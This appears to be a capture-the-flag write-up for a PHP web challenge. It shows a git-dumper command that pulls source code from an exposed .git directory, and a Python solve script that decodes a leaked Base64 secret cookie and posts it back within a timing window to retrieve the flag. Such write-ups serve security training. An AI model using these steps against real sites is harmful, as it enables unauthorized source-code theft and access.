The challenge exposes the `.git` directory.
Using `git-dumper`, the source code was recovered:

```bash id="wd94jz"
git-dumper http://TARGET/.git/ dump
```

Inside `index.php`, the application generates a random secret:

```php id="c22f6m"
$_SESSION['flooog'] = $flog;
```

and stores a Base64-encoded version in a cookie:

```php id="a8x4qt"
setcookie("secret",base64_encode($flog));
```

To get the flag, the application checks:

```php id="c1z0jh"
$_POST['Q'] == $_SESSION['flooog']
```

within 3 seconds:

```php id="m8f6wa"
(mstime() - $_SESSION['counter']) < 2999
```

## Exploitation Steps

1. Visit the page to receive:

   * `PHPSESSID`
   * `secret` cookie

2. URL decode + Base64 decode the `secret` cookie.

3. Send the decoded value as POST parameter `Q` immediately.

## Solve Script

```python id="k0t7sm"
import requests
import base64
import urllib.parse

url = "http://TARGET/index.php"

s = requests.Session()

r = s.get(url)

secret = s.cookies.get("secret")
secret = urllib.parse.unquote(secret)
decoded = base64.b64decode(secret).decode()

r = s.post(url, data={"Q": decoded})

print(r.text)
```

The script performs both requests fast enough to bypass the 3-second restriction and returns the real flag.
